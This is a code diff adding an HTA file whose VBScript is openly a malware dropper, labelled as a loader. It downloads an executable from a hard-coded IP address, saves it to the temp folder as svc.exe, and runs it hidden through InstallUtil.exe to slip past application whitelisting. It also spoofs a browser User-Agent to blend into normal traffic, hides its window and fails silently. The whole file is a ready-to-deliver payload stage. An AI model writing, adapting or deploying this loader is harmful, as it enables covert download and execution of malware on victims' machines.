@@ -1,0 +1,74 @@
+<html>
+<head>
+<title> </title>
+<HTA:APPLICATION ID="loader" APPLICATIONNAME="loader" BORDER="none" CAPTION="no" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" SYSMENU="no" WINDOWSTATE="minimize" />
+<script language="VBScript">
+  ' =============================================================================
+  ' HTTP-Download Raw Binary HTA Loader
+  '
+  ' Downloads a raw EXE over HTTP using MSXML2.XMLHTTP (responseBody), writes
+  ' to disk via ADODB.Stream, and executes via InstallUtil.exe /U.
+  '
+  ' No Base64 encoding step needed — host the raw loader.exe directly.
+  ' No bitsadmin, no certutil, no PowerShell — all COM objects.
+  '
+  ' Configure payloadUrl below before delivery.
+  ' =============================================================================
+
+  On Error Resume Next
+
+  ' -- CONFIG: Set your payload URL --------------------------------------------
+  Dim payloadUrl : payloadUrl = "http://192.168.45.221/loader.exe"
+
+  ' -- Step 1: Download raw binary over HTTP ------------------------------------
+  Dim bytes : bytes = DownloadBinary(payloadUrl)
+  If Err.Number <> 0 Then Call Fail("Download failed")
+
+  ' -- Step 2: Write to %TEMP%\svc.exe ------------------------------------------
+  Dim fso, tmpPath
+  Set fso = CreateObject("Scripting.FileSystemObject")
+  tmpPath = fso.GetSpecialFolder(2) & "\svc.exe"
+  WriteBinary tmpPath, bytes
+  If Err.Number <> 0 Then Call Fail("Write failed")
+
+  ' -- Step 3: Execute via InstallUtil ------------------------------------------
+  ' FIXED: quote paths — handles usernames with spaces (e.g. "John Doe")
+  Dim installUtil
+  installUtil = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe"
+  CreateObject("WScript.Shell").Run """" & installUtil & """ /U """ & tmpPath & """", 0, False
+
+  ' -- Close the HTA window -----------------------------------------------------
+  self.close()
+
+  ' -- Helpers ------------------------------------------------------------------
+
+  ' Download binary content over HTTP using MSXML2.XMLHTTP.
+  ' responseBody returns a VT_ARRAY | VT_UI1 byte array — no Base64 needed.
+  ' Sets a browser User-Agent to blend in with normal web traffic.
+  Function DownloadBinary(url)
+    Dim http : Set http = CreateObject("MSXML2.XMLHTTP")
+    http.Open "GET", url, False
+    http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    http.Send
+    If http.Status <> 200 Then Err.Raise 1, "DownloadBinary", "HTTP " & http.Status
+    DownloadBinary = http.responseBody
+  End Function
+
+  ' Write a byte array to disk using ADODB.Stream (no certutil)
+  Sub WriteBinary(path, data)
+    Dim stream : Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 1  ' adTypeBinary
+    stream.Open
+    stream.Write data
+    stream.SaveToFile path, 2  ' adSaveCreateOverWrite
+    stream.Close
+  End Sub
+
+  Sub Fail(msg)
+    ' Silent fail — no error dialogs
+    self.close()
+  End Sub
+</script>
+</head>
+<body>Loading...</body>
+</html>
